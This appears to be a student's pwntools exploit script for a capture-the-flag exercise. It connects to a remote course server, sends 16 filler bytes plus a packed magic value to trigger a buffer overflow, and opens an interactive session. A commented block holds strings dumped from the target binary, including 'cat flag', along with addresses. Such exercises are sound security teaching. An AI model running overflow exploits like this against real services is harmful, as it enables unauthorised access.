from pwn import *

context.log_level = 'debug'

io = remote('inf226.puffling.no', 7000)
print(io.recvline())

bufferoverflow = b'X'*16
target = flat(0x79beef8b)
print(target)

data = bufferoverflow + target
io.sendline(data)
#print(io.recvline())
io.interactive()

'''
context.log_level = 'debug'
0x0d696914


io = remote('inf226.puffling.no', 6001)

b'\x01\x00\x02\x00\x00\x00\x00\x00Input an argument to pass\x0000.c\x00\x00fgets(locals.buffer, 512, stdin) != NULL\x00\x00\x00\x00\x00\x00\x00\x00Well done, you can get the flag\x00cat flag\x00\x00\x00\x00\x00\x00\x00\x00Uh oh, 
value is not correct. please try again. Goodbye.\x00main\x00'
0x00000000000011b9 fgets
2882388943
1192 puts
11f3 puts
121c
2042556299
'''